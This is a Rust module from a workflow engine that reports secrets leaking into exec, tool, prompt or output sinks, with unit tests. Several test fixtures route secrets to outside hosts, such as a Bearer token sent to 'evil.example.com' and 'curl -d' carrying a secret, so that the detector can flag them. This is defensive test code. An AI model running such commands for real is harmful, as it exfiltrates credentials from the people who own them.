// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2024-2026 SuperNovae Studio <contact@supernovae.studio>

//! Secret-leak reporting — a thin reader over the IFC flow facts.
//!
//! Per spec `04-variables.md` §secrets · the engine masks its OWN output
//! (logs · traces · journal), but it CANNOT follow a `secrets.X` that the
//! author routes into a subprocess or tool which re-emits it into captured
//! output. The detection is the [`flow`](super::flow) IFC engine (ADR-092);
//! this module turns its taint facts into the two reportable findings ·
//!
//! - [`SecretLeak`] — a secret reaches an `exec`/`invoke` EFFECT (directly,
//!   via a `with:` alias, via a `for_each` item, or transitively through a
//!   tainted upstream output). The full taint chain is carried.
//! - [`SecretEgress`] — a secret reaches the workflow `outputs:` (it leaves
//!   the run as the return value · the literal exfiltration case).
//!
//! `infer`/`agent` PROMPTS are provider-egress sinks (BUG#3 · a secret in a
//! prompt leaves the run to a third-party provider · sanction with `egress:
//! [{ to: "infer" }]` / `{ to: "agent" }`). Their OUTPUT keeps the carve-out
//! (the model response is not a verbatim echo · never taints downstream ·
//! ADR-092 · flow.rs §4).

use super::flow::FlowFacts;
use nika_schema::raw::{RawAction, RawWorkflow};

/// A secret that escapes the masking boundary into an effect.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
#[non_exhaustive]
pub struct SecretLeak {
    /// The task whose effect can re-emit the secret.
    pub task: String,
    /// The originating secret name (`secrets.<name>`).
    pub secret: String,
    /// The effect surface (`exec` · `invoke`).
    pub sink: &'static str,
    /// The EXACT `egress.to:` value that would sanction this sink — the
    /// tool id for an invoke (`nika:jq`), else the surface (`exec` ·
    /// `infer` · `agent`). Feeds the one-line fix so the flagship IFC
    /// finding is self-serve (use-case battery 2026-07-11 · T2).
    pub sink_id: String,
    /// The full taint chain (`secrets.x → with.t → ...`) for diagnostics.
    pub trace: String,
    /// WHY the edge refused — the fix ladder's rung (the finding names
    /// the layer that actually failed: no egress · sink · host ·
    /// capability · derived destination · broken self-URL shape).
    pub reason: super::declass::LeakReason,
}

/// The secret's declared egress rules by name (the scan's own lookup —
/// a leak always names a DECLARED secret, so the entry exists).
fn egress_of<'a>(wf: &'a RawWorkflow, secret: &str) -> &'a [nika_schema::types::EgressRule] {
    wf.secrets
        .iter()
        .find(|(name, _)| name.value == secret)
        .map_or(&[], |(_, decl)| decl.value.egress.as_slice())
}

/// The precise `egress.to:` clearance a leak needs: an invoke's tool id
/// (`nika:jq` · `mcp:srv/tool`) is the SPECIFIC sink; every other surface
/// IS its own `to:` token.
fn sink_id_of(action: &RawAction) -> String {
    match action {
        RawAction::Invoke(inv) => match &inv.target {
            nika_schema::raw::RawInvokeTarget::Tool(t) => t.value.clone(),
            // a secret into a child's args egresses to THAT child
            nika_schema::raw::RawInvokeTarget::Workflow(w) => w.value.clone(),
        },
        RawAction::Exec(_) => "exec".to_owned(),
        RawAction::Infer(_) => "infer".to_owned(),
        RawAction::Agent(_) => "agent".to_owned(),
        #[allow(
            clippy::unreachable,
            reason = "non_exhaustive future variant — enum and checker ship together; fail loud beats silently-wrong output"
        )]
        other => unreachable!("unknown action: {other:?}"),
    }
}

/// A secret that leaves the run as a workflow return value.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
#[non_exhaustive]
pub struct SecretEgress {
    /// The `outputs:` entry name carrying the secret.
    pub output: String,
    /// The originating secret name.
    pub secret: String,
    /// The full taint chain for diagnostics.
    pub trace: String,
}

/// Report every effect-leak from the precomputed flow facts — main verbs
/// AND `on_finally` cleanup verbs (the trace's `on_finally @ <task>` hop
/// distinguishes the cleanup case).
#[must_use]
pub(super) fn scan_leaks(wf: &RawWorkflow, flow: &FlowFacts) -> Vec<SecretLeak> {
    let mut leaks = Vec::new();
    let permits = wf.permits.as_ref().map(|s| &s.value);
    for (idx, task) in wf.tasks.iter().enumerate() {
        // The flow facts are already sanction-filtered (declass · ADR-092):
        // `effect_leaks` holds only UNSANCTIONED secret→sink edges. A secret
        // whose `egress:` clears this sink does not appear here.
        for trace in flow.effect_leaks(idx) {
            leaks.push(SecretLeak {
                task: task.value.id.value.clone(),
                secret: trace.secret.clone(),
                sink: match &task.value.action {
                    RawAction::Exec(_) => "exec",
                    RawAction::Invoke(_) => "invoke",
                    // The infer/agent prompt is a provider-egress sink (BUG#3
                    // · a secret in a prompt leaves the run to a third party).
                    RawAction::Infer(_) => "infer",
                    RawAction::Agent(_) => "agent",
                    #[allow(
                        clippy::unreachable,
                        reason = "non_exhaustive future variant — enum and checker ship together; fail loud beats silently-wrong output"
                    )]
                    other => unreachable!("unknown action: {other:?}"),
                },
                sink_id: sink_id_of(&task.value.action),
                trace: trace.render(),
                reason: super::declass::leak_reason(
                    egress_of(wf, &trace.secret),
                    &task.value.action,
                    permits,
                ),
            });
        }
    }
    leaks
}

/// Report every workflow-output egress from the precomputed flow facts.
#[must_use]
pub(super) fn scan_egresses(flow: &FlowFacts) -> Vec<SecretEgress> {
    flow.egresses()
        .into_iter()
        .map(|(output, trace)| SecretEgress {
            output: output.to_owned(),
            secret: trace.secret.clone(),
            trace: trace.render(),
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::analyzer::analyze;
    use nika_schema::parser::{ParseMode, parse};
    use nika_schema::source::FileId;

    fn leaks_of(yaml: &str) -> Vec<SecretLeak> {
        let wf = parse(yaml, FileId::new(0), ParseMode::Strict).expect("parse");
        let a = analyze(&wf).expect("analyze");
        let flow = super::super::flow::analyze_flow(&wf, &a.topo_waves);
        scan_leaks(&wf, &flow)
    }

    fn egresses_of(yaml: &str) -> Vec<SecretEgress> {
        let wf = parse(yaml, FileId::new(0), ParseMode::Strict).expect("parse");
        let a = analyze(&wf).expect("analyze");
        let flow = super::super::flow::analyze_flow(&wf, &a.topo_waves);
        scan_egresses(&flow)
    }

    const SECRETS: &str = "\
secrets:
  api_key:
    source: vault
    key: prod/key
";

    #[test]
    fn secret_into_exec_command_leaks() {
        let yaml = format!(
            "nika: leak\n{SECRETS}tasks:\n  t:\n    exec: {{ shell: \"curl -H 'Auth: ${{{{ secrets.api_key }}}}' x\" }}\n"
        );
        let l = leaks_of(&yaml);
        assert_eq!(l.len(), 1);
        assert_eq!(l[0].secret, "api_key");
        assert_eq!(l[0].sink, "exec");
    }

    #[test]
    fn secret_into_exec_env_leaks() {
        let yaml = format!(
            "nika: leak\n{SECRETS}tasks:\n  t:\n    exec:\n      command: [\"printenv\"]\n      env:\n        TOKEN: \"${{{{ secrets.api_key }}}}\"\n"
        );
        let l = leaks_of(&yaml);
        assert_eq!(l.len(), 1);
        assert_eq!(l[0].sink, "exec");
    }

    #[test]
    fn secret_into_invoke_args_leaks() {
        let yaml = format!(
            "nika: leak\n{SECRETS}tasks:\n  t:\n    invoke: {{ tool: \"nika:write\", args: {{ path: \"x\", content: \"${{{{ secrets.api_key }}}}\" }} }}\n"
        );
        let l = leaks_of(&yaml);
        assert_eq!(l.len(), 1);
        assert_eq!(l[0].sink, "invoke");
    }

    #[test]
    fn secret_into_infer_prompt_is_a_leak() {
        // BUG#3: a secret in an infer prompt leaves the run to a third-party
        // provider — a leak (sink "infer") unless sanctioned by `to: "infer"`.
        let yaml = format!(
            "nika: leak\n{SECRETS}tasks:\n  t:\n    infer: {{ prompt: \"use ${{{{ secrets.api_key }}}}\", max_tokens: 10 }}\n"
        );
        let l = leaks_of(&yaml);
        assert_eq!(l.len(), 1, "the provider send is a leak");
        assert_eq!(l[0].secret, "api_key");
        assert_eq!(l[0].sink, "infer");
    }

    #[test]
    fn secret_into_agent_prompt_is_a_leak() {
        // BUG#3: the agent prompt is the same provider-egress sink.
        let yaml = format!(
            "nika: leak\n{SECRETS}tasks:\n  t:\n    agent: {{ prompt: \"do ${{{{ secrets.api_key }}}}\", max_turns: 2 }}\n"
        );
        let l = leaks_of(&yaml);
        assert_eq!(l.len(), 1);
        assert_eq!(l[0].sink, "agent");
    }

    #[test]
    fn non_secret_prompt_is_clean() {
        // A prompt with no secret reference is clean (no false positive).
        let yaml = format!(
            "nika: ok\n{SECRETS}tasks:\n  t:\n    infer: {{ prompt: \"just text\", max_tokens: 10 }}\n"
        );
        assert!(leaks_of(&yaml).is_empty(), "no secret reference → no leak");
    }

    #[test]
    fn no_secrets_declared_no_scan() {
        let yaml = "nika: none\ntasks:\n  t:\n    exec: { command: [\"echo\", \"hi\"] }\n";
        assert!(leaks_of(yaml).is_empty());
    }

    #[test]
    fn with_aliased_secret_now_leaks_with_a_trace() {
        // The review's false negative — fixed by the IFC engine.
        let yaml = format!(
            "nika: w\n{SECRETS}tasks:\n  t:\n    with: {{ tok: \"${{{{ secrets.api_key }}}}\" }}\n    exec: {{ shell: \"curl -H ${{{{ with.tok }}}}\" }}\n"
        );
        let l = leaks_of(&yaml);
        assert_eq!(l.len(), 1);
        assert!(l[0].trace.contains("with.tok"), "trace: {}", l[0].trace);
    }

    #[test]
    fn secret_egress_into_outputs_is_reported() {
        let yaml = format!(
            "nika: w\n{SECRETS}tasks:\n  a:\n    exec: {{ shell: \"echo ${{{{ secrets.api_key }}}}\" }}\noutputs:\n  leaked: ${{{{ tasks.a.output }}}}\n"
        );
        let e = egresses_of(&yaml);
        assert_eq!(e.len(), 1);
        assert_eq!(e[0].output, "leaked");
        assert_eq!(e[0].secret, "api_key");
    }

    #[test]
    fn literal_prose_mentioning_secret_is_not_a_leak() {
        // No ${{ }} island → no reference → no leak (the prose false positive).
        let yaml = format!(
            "nika: w\n{SECRETS}tasks:\n  t:\n    exec: {{ command: [\"echo\", \"'set\", \"secrets.api_key\", \"in\", \"vault'\"] }}\n"
        );
        assert!(
            leaks_of(&yaml).is_empty(),
            "prose mention is not a reference"
        );
    }
}

/// Sanctioned secret egress (declassification · ADR-092) — the end-to-end
/// contract: a `secrets.X` with an `egress:` clause that clears its sink is
/// no longer a leak, while the laundering shapes stay leaks. Drives the
/// L1∧L2∧L3 composition through the real parse → flow → `scan_leaks` path.
#[cfg(test)]
mod declassification {
    use super::*;
    use crate::analyzer::analyze;
    use nika_schema::parser::{ParseMode, parse};
    use nika_schema::source::FileId;
    use std::collections::BTreeSet;

    fn leaks_of(yaml: &str) -> Vec<SecretLeak> {
        let wf = parse(yaml, FileId::new(0), ParseMode::Strict).expect("parse");
        let a = analyze(&wf).expect("analyze");
        let flow = super::super::flow::analyze_flow(&wf, &a.topo_waves);
        scan_leaks(&wf, &flow)
    }

    fn report_of(yaml: &str) -> crate::CheckReport {
        let wf = parse(yaml, FileId::new(0), ParseMode::Strict).expect("parse");
        crate::check(&wf)
    }

    #[test]
    fn multi_secret_consent_matrix_judges_every_shared_sink_edge() {
        for reverse in [false, true] {
            for clear_alpha in [false, true] {
                for clear_omega in [false, true] {
                    let alpha_egress = if clear_alpha {
                        "    egress: [{ to: \"mcp:service/send\" }]\n"
                    } else {
                        ""
                    };
                    let omega_egress = if clear_omega {
                        "    egress: [{ to: \"mcp:service/send\" }]\n"
                    } else {
                        ""
                    };
                    let payload = if reverse {
                        "${{ secrets.omega }}:${{ secrets.alpha }}"
                    } else {
                        "${{ secrets.alpha }}:${{ secrets.omega }}"
                    };
                    let yaml = format!(
                        "nika: multi-secret\nsecrets:\n  alpha:\n    source: env\n    key: ALPHA\n{alpha_egress}  omega:\n    source: env\n    key: OMEGA\n{omega_egress}permits:\n  tools: [\"mcp:service/send\"]\ntasks:\n  send:\n    invoke:\n      tool: \"mcp:service/send\"\n      args: {{ payload: \"{payload}\" }}\n"
                    );
                    let report = report_of(&yaml);
                    let actual: BTreeSet<&str> = report
                        .secret_leaks
                        .iter()
                        .map(|leak| leak.secret.as_str())
                        .collect();
                    let expected: BTreeSet<&str> =
                        [(!clear_alpha, "alpha"), (!clear_omega, "omega")]
                            .into_iter()
                            .filter_map(|(leaks, name)| leaks.then_some(name))
                            .collect();
                    assert_eq!(actual, expected, "reverse={reverse} yaml={yaml}");
                    assert_eq!(
                        report.is_clean(),
                        expected.is_empty(),
                        "the verdict follows the complete edge set: {yaml}"
                    );
                }
            }
        }
    }

    #[test]
    fn distinct_exec_fields_each_contribute_their_secret() {
        let leaks = leaks_of(
            r#"
nika: exec-fields
secrets:
  command_secret: { source: env, key: COMMAND_SECRET }
  stdin_secret: { source: env, key: STDIN_SECRET }
permits:
  exec: [printf]
tasks:
  send:
    exec:
      command: [printf, "${{ secrets.command_secret }}"]
      stdin: "${{ secrets.stdin_secret }}"
"#,
        );
        let actual: BTreeSet<&str> = leaks.iter().map(|leak| leak.secret.as_str()).collect();
        assert_eq!(actual, BTreeSet::from(["command_secret", "stdin_secret"]));
    }

    #[test]
    fn fetch_host_clearance_is_judged_per_secret() {
        let report = report_of(
            r#"
nika: fetch-edges
secrets:
  cleared:
    source: env
    key: CLEARED
    egress: [{ to: "nika:fetch", host: "api.example.com" }]
  uncleared: { source: env, key: UNCLEARED }
permits:
  tools: ["nika:fetch"]
  net: { http: ["api.example.com"] }
tasks:
  send:
    invoke:
      tool: "nika:fetch"
      args:
        url: "https://api.example.com/send"
        headers:
          Authorization: "Bearer ${{ secrets.cleared }}"
          X-Other: "${{ secrets.uncleared }}"
"#,
        );
        assert_eq!(report.secret_leaks.len(), 1, "{report:?}");
        assert_eq!(report.secret_leaks[0].secret, "uncleared");
    }

    #[test]
    fn list_item_carries_every_secret_to_the_sink() {
        let leaks = leaks_of(
            r#"
nika: list-item
secrets:
  alpha: { source: env, key: ALPHA }
  omega: { source: env, key: OMEGA }
permits:
  tools: ["mcp:service/send"]
tasks:
  send:
    for_each:
      items: ["${{ secrets.alpha }}", "${{ secrets.omega }}"]
    invoke:
      tool: "mcp:service/send"
      args: { payload: "${{ item }}" }
"#,
        );
        let actual: BTreeSet<&str> = leaks.iter().map(|leak| leak.secret.as_str()).collect();
        assert_eq!(actual, BTreeSet::from(["alpha", "omega"]));
    }

    #[test]
    fn sanctioned_fetch_literal_host_is_clean() {
        let yaml = "\
nika: w
secrets:
  stripe:
    source: env
    key: STRIPE_KEY
    egress:
      - to: \"nika:fetch\"
        host: \"api.stripe.com\"
tasks:
  charge:
    invoke:
      tool: \"nika:fetch\"
      args:
        url: \"https://api.stripe.com/v1/charges\"
        headers: { Authorization: \"Bearer ${{ secrets.stripe }}\" }
";
        assert!(leaks_of(yaml).is_empty(), "cleared host → clean");
    }

    #[test]
    fn sanctioned_fetch_to_unlisted_host_still_leaks() {
        let yaml = "\
nika: w
secrets:
  stripe:
    source: env
    key: STRIPE_KEY
    egress:
      - to: \"nika:fetch\"
        host: \"api.stripe.com\"
tasks:
  charge:
    invoke:
      tool: \"nika:fetch\"
      args:
        url: \"https://evil.example.com/x\"
        headers: { Authorization: \"Bearer ${{ secrets.stripe }}\" }
";
        let l = leaks_of(yaml);
        assert_eq!(l.len(), 1, "a cleared host is not every host");
        assert_eq!(l[0].secret, "stripe");
    }

    #[test]
    fn host_clause_with_derived_destination_still_leaks() {
        // robust declass: the host is templated → not author-fixed.
        let yaml = "\
nika: w
const: { ep: \"api.stripe.com\" }
secrets:
  stripe:
    source: env
    key: STRIPE_KEY
    egress:
      - to: \"nika:fetch\"
        host: \"api.stripe.com\"
tasks:
  charge:
    invoke:
      tool: \"nika:fetch\"
      args:
        url: \"https://${{ const.ep }}/v1/charges\"
        headers: { Authorization: \"Bearer ${{ secrets.stripe }}\" }
";
        assert_eq!(leaks_of(yaml).len(), 1, "templated host is injectable");
    }

    #[test]
    fn host_from_self_direct_secret_url_is_clean() {
        let yaml = "\
nika: w
secrets:
  hook:
    source: env
    key: WEBHOOK
    egress:
      - to: \"nika:notify\"
        host_from_self: true
tasks:
  alert:
    invoke:
      tool: \"nika:notify\"
      args:
        channel: webhook
        target: \"${{ secrets.hook }}\"
        message: \"hi\"
";
        assert!(leaks_of(yaml).is_empty(), "the secret IS the URL → clean");
    }

    #[test]
    fn host_from_self_with_concatenated_url_still_leaks() {
        let yaml = "\
nika: w
secrets:
  hook:
    source: env
    key: WEBHOOK
    egress:
      - to: \"nika:notify\"
        host_from_self: true
tasks:
  alert:
    invoke:
      tool: \"nika:notify\"
      args:
        channel: webhook
        target: \"${{ secrets.hook }}/extra/path\"
        message: \"hi\"
";
        assert_eq!(leaks_of(yaml).len(), 1, "concatenation breaks the self-URL");
    }

    #[test]
    fn host_from_self_with_second_secret_in_body_still_leaks() {
        // non-occlusion: a second secret rides out under the trusted URL.
        let yaml = "\
nika: w
secrets:
  hook:
    source: env
    key: WEBHOOK
    egress:
      - to: \"nika:notify\"
        host_from_self: true
  apikey:
    source: env
    key: API_KEY
tasks:
  alert:
    invoke:
      tool: \"nika:notify\"
      args:
        channel: webhook
        target: \"${{ secrets.hook }}\"
        message: \"token is ${{ secrets.apikey }}\"
";
        let l = leaks_of(yaml);
        // the occluded second secret is the leak (hook itself is cleared,
        // but the body secret has no egress → it leaks).
        assert!(
            l.iter().any(|x| x.secret == "apikey"),
            "the smuggled secret leaks: {l:?}"
        );
    }

    #[test]
    fn cross_tool_laundering_still_leaks() {
        // egress cleared nika:fetch, but the secret is used in exec.
        let yaml = "\
nika: w
secrets:
  k:
    source: env
    key: K
    egress:
      - to: \"nika:fetch\"
        host: \"api.x.com\"
tasks:
  t:
    exec: { command: [\"curl\", \"-d\", \"${{ secrets.k }}\", \"https://api.x.com\"] }
";
        let l = leaks_of(yaml);
        assert_eq!(l.len(), 1, "fetch clearance never authorizes exec");
        assert_eq!(l[0].sink, "exec");
    }

    #[test]
    fn permits_net_intersection_blocks_egress() {
        // host cleared by egress but absent from permits.net.http (L3).
        let yaml = "\
nika: w
permits:
  net: { http: [\"api.anthropic.com\"] }
  tools: [\"nika:fetch\"]
secrets:
  k:
    source: env
    key: K
    egress:
      - to: \"nika:fetch\"
        host: \"api.stripe.com\"
tasks:
  t:
    invoke:
      tool: \"nika:fetch\"
      args:
        url: \"https://api.stripe.com/v1/x\"
        headers: { Authorization: \"${{ secrets.k }}\" }
";
        assert_eq!(
            leaks_of(yaml).len(),
            1,
            "egress narrows permits · cannot widen"
        );
    }

    #[test]
    fn unsanctioned_secret_into_infer_now_leaks() {
        // BUG#3: a secret into an infer prompt with NO egress is a leak (it
        // leaves the run to a third-party provider · supersedes the prior
        // unconditional carve-out · same class as a secret→mcp: tool).
        let yaml = "\
nika: w
secrets:
  k:
    source: env
    key: K
tasks:
  t:
    infer: { prompt: \"use ${{ secrets.k }}\", max_tokens: 10 }
";
        let l = leaks_of(yaml);
        assert_eq!(l.len(), 1, "an unsanctioned provider send leaks");
        assert_eq!(l[0].sink, "infer");
    }

    #[test]
    fn sanctioned_infer_egress_is_clean() {
        // BUG#3: `to: "infer"` sanctions the prompt send (sink-only rule · no
        // host clause · the provider endpoint is operator-chosen, not a
        // workflow-controlled URL — L2/L3 vacuous, same shape as an `exec`
        // egress). The OUTPUT is never tainted regardless (flow.rs §4).
        let yaml = "\
nika: w
secrets:
  k:
    source: env
    key: K
    egress:
      - to: \"infer\"
tasks:
  t:
    infer: { prompt: \"use ${{ secrets.k }}\", max_tokens: 10 }
";
        assert!(
            leaks_of(yaml).is_empty(),
            "an explicit `to: infer` egress clears the send"
        );
    }

    #[test]
    fn sanctioned_agent_egress_is_clean_but_infer_clearance_does_not_cross() {
        // `to: "agent"` clears the agent send; an `infer`-only clearance does
        // NOT cross to an agent sink (the no-cross-tool-laundering rule).
        let agent_ok = "\
nika: w
secrets:
  k:
    source: env
    key: K
    egress:
      - to: \"agent\"
tasks:
  t:
    agent: { prompt: \"do ${{ secrets.k }}\", max_turns: 2 }
";
        assert!(
            leaks_of(agent_ok).is_empty(),
            "`to: agent` clears the agent send"
        );

        let wrong_sink = "\
nika: w
secrets:
  k:
    source: env
    key: K
    egress:
      - to: \"infer\"
tasks:
  t:
    agent: { prompt: \"do ${{ secrets.k }}\", max_turns: 2 }
";
        let l = leaks_of(wrong_sink);
        assert_eq!(
            l.len(),
            1,
            "an infer clearance never authorizes an agent send"
        );
        assert_eq!(l[0].sink, "agent");
    }

    #[test]
    fn unsanctioned_later_cleanup_still_leaks_past_a_sanctioned_one() {
        // soundness: a sanctioned FIRST cleanup must not mask an
        // unsanctioned SECOND one.
        let yaml = "\
nika: w
secrets:
  hook:
    source: env
    key: WEBHOOK
    egress:
      - to: \"nika:notify\"
        host_from_self: true
  raw:
    source: env
    key: RAW
tasks:
  t:
    exec: { command: [\"echo\", \"done\"] }
  t_notify:
    after: { t: unwind }
    invoke:
      tool: \"nika:notify\"
      args: { channel: webhook, target: \"${{ secrets.hook }}\", message: \"ok\" }
  t_curl:
    after: { t: unwind }
    exec: { command: [\"curl\", \"-d\", \"${{ secrets.raw }}\", \"https://x.com\"] }
";
        let l = leaks_of(yaml);
        assert!(
            l.iter().any(|x| x.secret == "raw" && x.sink == "exec"),
            "the unsanctioned later cleanup leaks: {l:?}"
        );
    }

    // ─── the fix ladder (the 2026-07-29 audit · run 4) ───────────────

    const KEYED: &str = "\
secrets:
  k:
    source: env
    key: K
";

    /// No `egress:` at all → the full sanction teach (`NoEgress`). An
    /// `egress:` naming a DIFFERENT sink → `SinkNotCleared` (the author
    /// already declassified; the fix is to ADD the sink, not re-learn
    /// the clause).
    #[test]
    fn the_ladder_distinguishes_no_egress_from_a_wrong_sink() {
        let bare = format!(
            "nika: w\n{KEYED}permits: {{ exec: [\"curl\"] }}\ntasks:\n  t:\n    exec: {{ command: [\"curl\", \"${{{{ secrets.k }}}}\", \"https://x.com\"] }}\n"
        );
        let l = leaks_of(&bare);
        assert!(
            matches!(l[0].reason, super::super::declass::LeakReason::NoEgress),
            "{:?}",
            l[0].reason
        );

        let wrong_sink = "\
nika: w
secrets:
  k:
    source: env
    key: K
    egress:
      - to: \"nika:notify\"
permits:
  tools: [\"nika:fetch\", \"nika:notify\"]
  net:
    http: [\"api.stripe.com\"]
tasks:
  t:
    invoke:
      tool: \"nika:fetch\"
      args:
        url: \"https://api.stripe.com/v1/x\"
        headers: { Authorization: \"Bearer ${{ secrets.k }}\" }
";
        let l = leaks_of(wrong_sink);
        assert!(
            matches!(
                &l[0].reason,
                super::super::declass::LeakReason::SinkNotCleared { sink } if sink == "nika:fetch"
            ),
            "{:?}",
            l[0].reason
        );
    }

    /// Right sink, wrong host → `HostMismatch` naming both hosts; right
    /// sink + right host but no `net.http` → `CapabilityMissing` (the
    /// capability layer is the one the fix must name — the audit's live
    /// case).
    #[test]
    fn the_ladder_names_the_host_and_the_capability_layer() {
        let wrong_host = "\
nika: w
secrets:
  k:
    source: env
    key: K
    egress:
      - to: \"nika:fetch\"
        host: \"other.example.com\"
permits:
  tools: [\"nika:fetch\"]
  net:
    http: [\"api.stripe.com\", \"other.example.com\"]
tasks:
  t:
    invoke:
      tool: \"nika:fetch\"
      args:
        url: \"https://api.stripe.com/v1/x\"
        headers: { Authorization: \"Bearer ${{ secrets.k }}\" }
";
        let l = leaks_of(wrong_host);
        assert!(
            matches!(
                &l[0].reason,
                super::super::declass::LeakReason::HostMismatch { declared, actual }
                    if declared == "other.example.com" && actual == "api.stripe.com"
            ),
            "{:?}",
            l[0].reason
        );

        let capability_missing = "\
nika: w
secrets:
  k:
    source: env
    key: K
    egress:
      - to: \"nika:fetch\"
        host: \"api.stripe.com\"
permits:
  tools: [\"nika:fetch\"]
tasks:
  t:
    invoke:
      tool: \"nika:fetch\"
      args:
        url: \"https://api.stripe.com/v1/x\"
        headers: { Authorization: \"Bearer ${{ secrets.k }}\" }
";
        let l = leaks_of(capability_missing);
        assert!(
            matches!(
                &l[0].reason,
                super::super::declass::LeakReason::CapabilityMissing { host }
                    if host == "api.stripe.com"
            ),
            "{:?}",
            l[0].reason
        );
    }

    /// A derived destination (templated URL) → `DerivedDestination`; a
    /// broken `host_from_self` shape (a second secret co-occurs) →
    /// `SelfShapeBroken`. The sanctioned form stays clean throughout.
    #[test]
    fn the_ladder_names_derived_destinations_and_broken_self_shapes() {
        let derived = "\
nika: w
const:
  host: \"api.stripe.com\"
secrets:
  k:
    source: env
    key: K
    egress:
      - to: \"nika:fetch\"
        host: \"api.stripe.com\"
permits:
  tools: [\"nika:fetch\"]
  net:
    http: [\"api.stripe.com\"]
tasks:
  t:
    invoke:
      tool: \"nika:fetch\"
      args:
        url: \"https://${{ const.host }}/v1/x\"
        headers: { Authorization: \"Bearer ${{ secrets.k }}\" }
";
        let l = leaks_of(derived);
        assert!(
            matches!(
                l[0].reason,
                super::super::declass::LeakReason::DerivedDestination
            ),
            "{:?}",
            l[0].reason
        );

        let broken_self = "\
nika: w
secrets:
  hook:
    source: env
    key: WEBHOOK
    egress:
      - to: \"nika:fetch\"
        host_from_self: true
  other: { source: env, key: OTHER }
permits:
  tools: [\"nika:fetch\"]
  net:
    http: [\"hooks.example.com\"]
tasks:
  t:
    invoke:
      tool: \"nika:fetch\"
      args:
        url: \"${{ secrets.hook }}\"
        headers: { Authorization: \"Bearer ${{ secrets.other }}\" }
";
        let l = leaks_of(broken_self);
        assert!(
            l.iter().any(|x| x.secret == "other"
                && matches!(x.reason, super::super::declass::LeakReason::NoEgress)),
            "the second secret is its own unsanctioned leak: {l:?}"
        );
    }

    /// The rendered fix names the LAYER (end-to-end through `check`): a
    /// capability-missing egress teaches `permits.net.http`, never
    /// « add the clause you already wrote ».
    #[test]
    fn the_rendered_fix_teaches_the_missing_layer() {
        let yaml = "\
nika: w
secrets:
  k:
    source: env
    key: K
    egress:
      - to: \"nika:fetch\"
        host: \"api.stripe.com\"
permits:
  tools: [\"nika:fetch\"]
tasks:
  t:
    invoke:
      tool: \"nika:fetch\"
      args:
        url: \"https://api.stripe.com/v1/x\"
        headers: { Authorization: \"Bearer ${{ secrets.k }}\" }
";
        let wf = parse(yaml, FileId::new(0), ParseMode::Strict).expect("parse");
        let report = crate::check(&wf);
        let finding = report
            .findings
            .iter()
            .find(|f| f.code.as_deref() == Some("NIKA-SEC-006"))
            .expect("the leak finding");
        assert!(
            finding.message.contains("permits.net.http")
                && !finding.message.contains("sanction it"),
            "the capability layer is the teach: {}",
            finding.message
        );
    }
}
